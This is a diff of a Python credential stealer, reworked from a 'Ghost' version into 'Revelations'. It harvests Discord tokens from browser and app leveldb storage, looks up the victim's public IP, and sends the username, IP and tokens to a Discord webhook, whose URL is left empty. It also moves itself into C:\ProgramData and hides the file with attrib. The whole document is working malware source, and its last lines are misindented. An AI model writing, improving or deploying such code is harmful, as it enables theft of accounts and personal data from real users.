@@ -1,13 +1,17 @@
+# [ Revelations ] [ rev ] ; Authored by zor
+#
+#
+
+
+
 import requests, os, re, sys, shutil, string, winreg
-
-
 from dhooks import Webhook, Embed
 
 
-#by @ytsix
+hook = Webhook("")
 
 
-def GhostExt(path):
+def RevelationsExtract(path):
     path += '\\Local Storage\\leveldb'
     tokens = []
     try:
@@ -24,11 +28,15 @@ def GhostExt(path):
         pass
 
 
-def GhostInf():
+def RevelationInfiltrate():
     
-    ghostrp = (os.path.join('ghost.py')) 
-    ghostlgm = r'C:\ProgramData\ghost.py'
+    ghostrp = (os.path.join('revelations.py')) 
+    ghostlgm = r'C:\ProgramData\revelations.py'
     shutil.move(ghostrp,ghostlgm)
+
+    hide = os.popen('attrib +h ' + ghostlgm)
+    hideit = hide.read()
+    hide.close()
 
     fp = os.path.dirname(os.path.realpath(__file__))
     file_name = sys.argv[0].split('\\')[-1]
@@ -39,11 +47,10 @@ def GhostInf():
                new_file_path)
 
 
-def GhostProc():
+def RevelationProcess():
 
-    hook = Webhook("")
     user = os.getenv("UserName")
-    hostname = requests.get("https://api.ipify.org").text 
+    hostname = requests.get("https://api.ipify.org").text
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
     paths = {
@@ -66,7 +73,7 @@ def GhostProc():
 
         message += '```'
 
-        tokens = GhostExt(path)
+        tokens = RevelationsExtract(path)
 
         if len(tokens) > 0:
             for token in tokens:
@@ -75,17 +82,13 @@ def GhostProc():
             pass
 
         message += '```'
-     
 
-
-def GhostSend():
-
-    embed = Embed(title=f' [ Ghost Scraped -> | {user} | {hostname} ] ',color=16764108)
-    embed.add_field("Goods =>",message)
-    hook.send(embed=embed)
+        embed = Embed(title=f' [ Rev Scraped -> | {user} | {hostname} ] ',color=16764108)
+        embed.add_field("Goods =>",message)
+        hook.send(embed=embed)
 
 
 
-GhostSend()        
-GhostProc()
-GhostInf()
+if __name__ == '__main__':
+	RevelationProcess()
+    RevelationInfiltrate()
